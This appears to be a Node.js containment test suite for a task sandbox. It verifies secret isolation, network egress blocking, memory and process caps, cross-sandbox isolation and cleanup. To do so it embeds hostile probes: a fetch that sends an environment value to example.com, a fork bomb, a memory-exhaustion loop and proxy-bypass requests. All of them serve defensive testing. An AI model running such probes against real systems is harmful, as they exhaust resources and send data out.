#!/usr/bin/env node
// Containment checks for the task sandbox. Each check runs against a fresh container and prints
// PASS or FAIL. These are the "blast radius" claims made in the README, measured.
// Usage: node test/containment.mjs   (after scripts/setup.sh; RING_RUNTIME=runsc runs the sandboxes in gVisor)
// At exit it writes ~/.ring/selftest/containment.json, the result the app shows on /status.
import { mkdirSync, readFileSync, renameSync, writeFileSync } from 'node:fs';
import { mkdtemp, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { STALE_NETWORK_MS, Sandbox, TASK_LABEL, run } from '../runner/sandbox.mjs';
import { runTask } from '../runner/run-task.mjs';

const results = [];
const check = (name, pass, detail) => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`); };
const gone = async (name) => (await run('docker', ['ps', '-aq', '--filter', `name=^${name}$`])).stdout.trim() === '';
const runtime = process.env.RING_RUNTIME || undefined;
console.log(`runtime: ${runtime ?? 'docker default'}`);

// The result file for /status, written at exit. A suite that crashes part-way gets one failed check
// more, so a partial run never reads as a full pass. `runtime` is what Docker reports for the sandbox;
// `commit` is the deployed commit (app/VERSION.json), so /status can tell a result from older code.
let sandboxRuntime = null;
let finished = false;
const deployedCommit = () => {
  try { return JSON.parse(readFileSync(new URL('../app/VERSION.json', import.meta.url), 'utf8')).commit ?? null; } catch { return null; }
};
process.on('exit', () => {
  const checks = results.map(({ name, pass }) => ({ name, pass }));
  if (!finished) checks.push({ name: 'the suite ran to the end', pass: false });
  const file = path.join(os.homedir(), '.ring', 'selftest', 'containment.json');
  try {
    mkdirSync(path.dirname(file), { recursive: true });
    const data = { suite: 'containment', runtime: sandboxRuntime ?? runtime ?? null, commit: deployedCommit(), passed: checks.filter((c) => c.pass).length, total: checks.length, at: new Date().toISOString(), checks };
    writeFileSync(`${file}.tmp`, `${JSON.stringify(data, null, 2)}\n`);
    renameSync(`${file}.tmp`, file);
  } catch (err) {
    console.error(`could not write ${file}: ${err.message}`);
  }
});
// Stopped from outside (the app's 20-minute self-test limit, Ctrl-C, a dropped SSH session): the
// sandboxes this run made go first, with their networks (8 s at most), then exit through the handler
// above, so the result file records a failed run instead of keeping the previous one.
let stopping = false;
for (const sig of ['SIGTERM', 'SIGINT', 'SIGHUP']) {
  process.on(sig, () => {
    if (stopping) return;
    stopping = true;
    Sandbox.destroyLive().catch(() => {}).finally(() => process.exit(1));
  });
}

// Sandbox networks left by an earlier run that was killed: Mantis Ring's own (by label), with no
// sandbox on them, older than 10 minutes (a task may be starting on a newer one).
try {
  const stale = await Sandbox.removeNetworks(TASK_LABEL, { minAgeMs: STALE_NETWORK_MS });
  if (stale) console.log(`removed ${stale} stale sandbox network(s)`);
} catch (err) {
  console.log(`note: stale sandbox networks were not removed: ${err.message}`);
}
/** The own network of every sandbox this suite makes: none may be left at the end. */
const networks = [];

// A secret on the host that must never reach the sandbox.
process.env.RING_FAKE_API_KEY = 'sk-should-never-leak';

const box = await Sandbox.create({ runtime });
networks.push(box.network);
try {
  sandboxRuntime = await box.runtimeName().catch(() => null);
  const env = await box.exec('env');
  const leaked = env.stdout.split('\n').filter((l) => /KEY|TOKEN|SECRET|PASSWORD/i.test(l));
  check('no secrets in the sandbox environment', leaked.length === 0 && !env.stdout.includes('sk-should-never-leak'), leaked.join(', ') || 'only proxy and path variables');

  const user = await box.exec('id -u');
  check('runs as an unprivileged user', user.stdout.trim() !== '0', `uid ${user.stdout.trim()}`);

  const ro = await box.exec('touch /usr/local/bin/x');
  check('root filesystem is read-only', ro.code !== 0, ro.stderr.trim().split('\n').pop());

  const direct = await box.exec(`node -e "require('net').connect(443, '1.1.1.1').on('connect', () => process.exit(0)).on('error', () => process.exit(1)); setTimeout(() => process.exit(2), 5000)"`, { timeoutMs: 15_000 });
  check('no direct route to the internet', direct.code !== 0, direct.code === 2 ? 'connect timed out' : 'connect refused');

  const gh = await box.exec('git ls-remote https://github.com/vulinh1704/mantis HEAD', { timeoutMs: 30_000 });
  check('allowlisted host works through the proxy (github.com)', gh.code === 0, gh.code === 0 ? 'git ls-remote ok' : gh.stderr.trim().split('\n').pop());

  const other = await box.exec('git ls-remote https://gitlab.com/gitlab-org/gitlab-foss.git HEAD', { timeoutMs: 30_000 });
  check('any other host is refused by the proxy', other.code !== 0, other.stderr.trim().split('\n').pop());

  const exfil = await box.exec(`node -e "fetch('https://example.com/?k=' + process.env.HOME).then(() => process.exit(0), () => process.exit(1))"`, { timeoutMs: 20_000 });
  check('a script cannot send data out (fetch to example.com)', exfil.code !== 0);

  // The loop prints how many MB it holds after each 256 MB block, so the check can tell "killed at the
  // cap" from "killed by something else". runc's OOM killer gives exit 137; gVisor kills the process
  // inside its own kernel and docker exec reports other codes, so under runsc the check accepts any
  // non-zero exit that came before the timeout with the last report at or under the 3 GB cap.
  const mem = await box.exec(`node -e "const a = []; for (;;) { a.push(Buffer.alloc(256 * 1024 * 1024, 1)); console.log(a.length * 256) }"`, { timeoutMs: 60_000 });
  const oom = (await run('docker', ['inspect', '-f', '{{.State.OOMKilled}} {{.State.Running}}', box.name])).stdout.trim();
  const heldMb = Number(mem.stdout.trim().split('\n').pop()) || 0;
  const capMb = 3 * 1024;
  const killed = mem.code === 137 || (runtime === 'runsc' && mem.code !== 0 && !mem.timedOut && heldMb <= capMb);
  check('memory is capped (allocation loop is killed)', killed, `exit ${mem.code}${mem.timedOut ? ' (timed out)' : ''}, held ${heldMb} MB of the ${capMb} MB cap when it stopped, container ${oom.endsWith('true') ? 'still running' : 'stopped'}`);
} finally {
  await box.destroy();
}
check('container is gone after destroy()', await gone(box.name));

// Two sandboxes at once, as two tasks of the app run: each on its own internal network, each with a
// server on port 3000 on every address it has. Neither may reach the other by IP (a TCP connect, an
// HTTP request, an ICMP echo), nor through the proxy by IP or by name, while each still reaches the
// proxy. The proxy is on both networks; it relays only to allowlisted hosts on port 443.
const SERVE = 'require("http").createServer((q, s) => s.end("ring-peer-ok")).listen(3000, "0.0.0.0")';
// node -e PROBE <peer ip> <own ip> <peer name> <gateway>: one line of JSON with what each try got.
const PROBE = [
  'const net = require("net"), http = require("http");',
  'const [peer, own, peerName, gw] = process.argv.slice(1);',
  'const T = 3000;',
  'const tcp = (host, port) => new Promise((ok) => {',
  '  const s = net.connect(port, host);',
  '  const t = setTimeout(() => { s.destroy(); ok("timeout"); }, T);',
  '  s.on("connect", () => { clearTimeout(t); s.destroy(); ok("connected"); });',
  '  s.on("error", (e) => { clearTimeout(t); ok(e.code || "error"); });',
  '});',
  'const get = (url) => new Promise((ok) => {',
  '  const q = http.get(url, { timeout: T }, (r) => { let b = ""; r.on("data", (d) => { b += d; }); r.on("end", () => ok(r.statusCode + " " + b.slice(0, 40))); });',
  '  q.on("timeout", () => { q.destroy(); ok("timeout"); });',
  '  q.on("error", (e) => ok(e.code || "error"));',
  '});',
  'const viaProxy = (head) => new Promise((ok) => {',
  '  const s = net.connect(8888, "ring-proxy");',
  '  const t = setTimeout(() => { s.destroy(); ok("timeout"); }, T);',
  '  s.on("connect", () => s.write(head + "\\r\\n\\r\\n"));',
  '  s.once("data", (d) => { clearTimeout(t); s.destroy(); ok(String(d).split("\\r\\n")[0]); });',
  '  s.on("error", (e) => { clearTimeout(t); ok(e.code || "error"); });',
  '});',
  '(async () => {',
  '  let self = "";',
  '  for (let i = 0; i < 20; i++) { self = await get("http://" + own + ":3000/"); if (self.startsWith("200")) break; await new Promise((r) => setTimeout(r, 250)); }',
  '  const out = { self };',
  '  out.tcp = await tcp(peer, 3000);',
  '  out.http = await get("http://" + peer + ":3000/");',
  '  out.proxyTcp = await tcp("ring-proxy", 8888);',
  '  out.proxyGet = await viaProxy("GET http://" + peer + ":3000/ HTTP/1.1\\r\\nHost: " + peer + ":3000\\r\\nConnection: close");',
  '  out.proxyConnect = await viaProxy("CONNECT " + peer + ":3000 HTTP/1.1\\r\\nHost: " + peer + ":3000");',
  '  out.proxyByName = await viaProxy("GET http://" + peerName + ":3000/ HTTP/1.1\\r\\nHost: " + peerName + ":3000\\r\\nConnection: close");',
  '  if (gw) out.host = await tcp(gw, 22);',
  '  console.log(JSON.stringify(out));',
  '})();',
].join('\n');
// perl -e PING <proxy ip> <peer ip>: an ICMP echo to each through an unprivileged ping socket (Linux
// and gVisor both have them); prints "reply", "no-reply", "unreachable" or why it could not try.
// The proxy's answer shows whether ICMP works in the sandbox at all.
const PING = [
  'use Socket;',
  'sub ping {',
  '  my ($ip) = @_;',
  '  return "none" unless $ip;',
  '  socket(my $s, PF_INET, SOCK_DGRAM, 1) or return "no-socket";',
  '  send($s, pack("CCnnnA4", 8, 0, 0, 0, 1, "ring"), 0, sockaddr_in(0, inet_aton($ip))) or return "unreachable";',
  '  my $r = ""; vec($r, fileno($s), 1) = 1;',
  '  select($r, undef, undef, 2) > 0 or return "no-reply";',
  '  defined(recv($s, my $b, 1500, 0)) or return "recv-error";',
  '  my $t = unpack("C", $b);',
  '  $t = unpack("C", substr($b, ($t & 15) * 4, 1)) if ($t >> 4) == 4;',
  '  return $t == 0 ? "reply" : "icmp-$t";',
  '}',
  'print join(" ", ping($ARGV[0]), ping($ARGV[1])), "\\n";',
].join('\n');
const IPV4 = /^\d{1,3}(\.\d{1,3}){3}$/;
/** {network: IPv4 address} of a container, as Docker reports it. */
const addresses = async (name) => {
  const r = await run('docker', ['inspect', '-f', '{{json .NetworkSettings.Networks}}', name], { timeoutMs: 30_000 });
  try { return Object.fromEntries(Object.entries(JSON.parse(r.stdout)).map(([k, v]) => [k, v?.IPAddress ?? ''])); } catch { return {}; }
};
const status = (s) => /^HTTP\/1\.[01] (\d{3})/.exec(s ?? '')?.[1] ?? String(s);
const pairName = 'two sandboxes at once cannot reach each other (TCP, HTTP and ping by IP; through the proxy by IP and by name), and each still reaches the proxy';
const made = await Promise.allSettled([Sandbox.create({ runtime }), Sandbox.create({ runtime })]);
const pair = made.flatMap((m) => (m.status === 'fulfilled' ? [m.value] : []));
networks.push(...pair.map((b) => b.network));
const notes = [];
try {
  if (pair.length < 2) throw new Error(`a sandbox did not start: ${made.find((m) => m.status === 'rejected')?.reason?.message}`);
  for (const b of pair) await b.execDetached(`node -e '${SERVE}'`, '/tmp/serve.log');
  const proxyAt = await addresses('ring-proxy');
  const views = [];
  for (const [i, b] of pair.entries()) {
    const nets = await addresses(b.name);
    const gw = await run('docker', ['network', 'inspect', '-f', '{{range .IPAM.Config}}{{.Gateway}} {{end}}', b.network], { timeoutMs: 30_000 });
    views.push({ tag: 'AB'[i], box: b, nets, ip: nets[b.network] ?? '', proxyIp: proxyAt[b.network] ?? '', gateway: gw.stdout.trim().split(/\s+/).find((s) => IPV4.test(s)) ?? '' });
  }
  const layout = views.every((v) => Object.keys(v.nets).length === 1 && IPV4.test(v.ip) && IPV4.test(v.proxyIp)) && views[0].box.network !== views[1].box.network;
  const rows = [`${views.map((v) => `${v.tag} ${v.ip} alone on ${Object.keys(v.nets).join('+') || 'no network'}, ring-proxy ${v.proxyIp || 'absent'} there`).join('; ')}`];
  let apart = layout;
  for (const [i, me] of views.entries()) {
    const peer = views[1 - i];
    const p = await me.box.execArgs(['node', '-e', PROBE, peer.ip, me.ip, peer.box.name, me.gateway], { timeoutMs: 60_000 });
    let r;
    try { r = JSON.parse(p.stdout.trim().split('\n').pop()); } catch { r = { error: (p.stderr || p.stdout || `exit ${p.code}`).trim().split('\n').pop() }; }
    const icmp = await me.box.execArgs(['perl', '-e', PING, me.proxyIp, peer.ip], { timeoutMs: 30_000 });
    const [pingProxy, pingPeer] = icmp.code === 0 ? icmp.stdout.trim().split(/\s+/) : ['no-perl', 'no-perl'];
    const ok = /^200 ring-peer-ok/.test(r.self ?? '') && r.tcp !== 'connected' && !/^\d{3}\b/.test(r.http ?? '200')
      && r.proxyTcp === 'connected' && [r.proxyGet, r.proxyConnect, r.proxyByName].every((x) => status(x) === '403')
      && pingPeer !== 'reply';
    apart &&= ok;
    rows.push(r.error ? `${me.tag}→${peer.tag}: the probe failed (${r.error})`
      : `${me.tag}→${peer.tag}: TCP ${r.tcp}, HTTP ${r.http}, ping ${pingPeer} (ping to the proxy: ${pingProxy}), through the proxy ${status(r.proxyGet)}/${status(r.proxyConnect)}/${status(r.proxyByName)}; ${me.tag}→proxy:8888 ${r.proxyTcp}; ${me.tag}'s own server ${String(r.self).split(' ')[0]}`);
    if (r.host !== undefined) notes.push(`${me.tag} → the host through its network's gateway ${me.gateway}:22: ${r.host}`);
  }
  check(pairName, apart, rows.join('; '));
} catch (err) {
  check(pairName, false, err.message);
} finally {
  await Promise.allSettled(pair.map((b) => b.destroy()));
}
for (const n of notes) console.log(`note  ${n} (not part of the check)`);
check('both of their containers are gone after destroy()', pair.length === 2 && (await Promise.all(pair.map((b) => gone(b.name)))).every(Boolean), pair.map((b) => b.name).join(', '));

// Fork bomb last, in its own sandbox: once the cap is hit nothing new can start inside, so the
// process count is read from the host (the container's cgroup) instead.
const bomb = await Sandbox.create({ runtime });
networks.push(bomb.network);
try {
  const r = await bomb.exec(`i=0; while [ $i -lt 700 ]; do sleep 60 > /dev/null 2>&1 & i=$((i+1)); done; echo started $i`, { timeoutMs: 60_000 });
  const pids = Number((await run('docker', ['stats', '--no-stream', '--format', '{{.PIDs}}', bomb.name])).stdout.trim());
  const refused = /fork|resource temporarily unavailable|cannot/i.test(r.stderr);
  const capped = pids > 0 && pids <= 512 && refused;
  // Under gVisor the cap also counts the sandbox kernel's own host threads (about two per process
  // inside), so the bomb reaches it after a few hundred processes and the whole sandbox stops.
  // That still holds the bomb at the cap; the check only accepts it when fewer than 700 started.
  let stopped = false;
  if (!capped && runtime === 'runsc' && !/started 700/.test(r.stdout)) {
    for (let i = 0; i < 20 && !stopped; i++) {
      stopped = (await run('docker', ['inspect', '-f', '{{.State.Running}}', bomb.name])).stdout.trim() !== 'true';
      if (!stopped) await new Promise((ok) => setTimeout(ok, 250));
    }
  }
  check('process count is capped (fork bomb)', capped || stopped, stopped
    ? `gVisor: the sandbox stopped at the 512 cap before 700 processes started (${r.stderr.trim().split('\n').pop()})`
    : `${pids} processes after trying 700; ${refused ? 'further forks refused' : 'no refusal seen'}`);
} finally {
  await bomb.destroy();
}
check('fork-bomb container is gone too', await gone(bomb.name));

// A dev server that never answers: the task must give up within its time limit and clean up.
const dir = await mkdtemp(path.join(os.tmpdir(), 'ring-hang-'));
await writeFile(path.join(dir, 'index.html'), '<h1>never served</h1>');
const t = Date.now();
const hung = await runTask({ repo: dir, devCmd: 'sleep 999', timeoutSec: 25, runtime });
networks.push(hung.network);
const secs = Math.round((Date.now() - t) / 1000);
check('a hanging task is stopped by the time limit', !hung.ok && /timed out/.test(hung.error ?? '') && secs <= 40, `${hung.error?.split('\n')[0]} after ${secs}s`);
check('its container is destroyed too', hung.destroyed && await gone(hung.sandbox));

// Every sandbox's own network went with it: none may pile up in Docker's address pools.
const ls = await run('docker', ['network', 'ls', '--format', '{{.Name}}'], { timeoutMs: 30_000 });
const present = new Set(ls.stdout.split('\n').map((s) => s.trim()).filter(Boolean));
const ours = networks.filter(Boolean);
const leftNets = ours.filter((n) => present.has(n));
const onProxy = Object.keys(await addresses('ring-proxy')).filter((n) => ours.includes(n));
check('no sandbox network is left after destroy(), and ring-proxy is on none of them', ls.code === 0 && ours.length === 5 && leftNets.length === 0 && onProxy.length === 0,
  ls.code !== 0 ? `docker network ls failed: ${ls.stderr.trim().split('\n').pop()}`
    : leftNets.length || onProxy.length ? `still there: ${[...new Set([...leftNets, ...onProxy])].join(' ')}` : `${ours.length} of 5 sandbox networks made and removed`);

const failed = results.filter((r) => !r.pass);
console.log(`\n${results.length - failed.length}/${results.length} containment checks passed`);
finished = true;
process.exit(failed.length ? 1 : 0);
